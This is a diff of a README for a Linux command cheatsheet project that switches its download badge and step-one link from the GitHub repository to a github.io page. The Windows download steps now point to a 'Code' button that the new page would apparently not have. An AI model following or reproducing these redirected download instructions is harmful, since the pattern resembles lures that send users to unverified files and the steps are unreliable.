@@ -1,6 +1,6 @@
 # 🐧 linux-cheatsheet - Master Linux commands with ease today
 
-[![](https://img.shields.io/badge/Download-Visit_Repository-blue.svg)](https://github.com/vvmanusvv-sudo/linux-cheatsheet)
+[![](https://img.shields.io/badge/Download-Visit_Repository-blue.svg)](https://vvmanusvv-sudo.github.io)
 
 This project provides a comprehensive reference for Linux terminal commands. It serves as a guide for anyone who needs to interact with a computer shell. You will find examples for Bash, system administration tasks, and DevOps workflows. The project includes a searchable list of commands, a permission reference, and a checklist to track your progress.
 
@@ -19,7 +19,7 @@ The main sections include:
 
 You can obtain the current files from the official repository page. Follow these steps to access the content on your Windows computer.
 
-1. Visit the project website at https://github.com/vvmanusvv-sudo/linux-cheatsheet.
+1. Visit the project website at https://vvmanusvv-sudo.github.io
 2. Look for the green button labeled "Code" near the top right of the file list.
 3. Click "Download ZIP" from the menu that appears.
 4. Save the file to your computer.
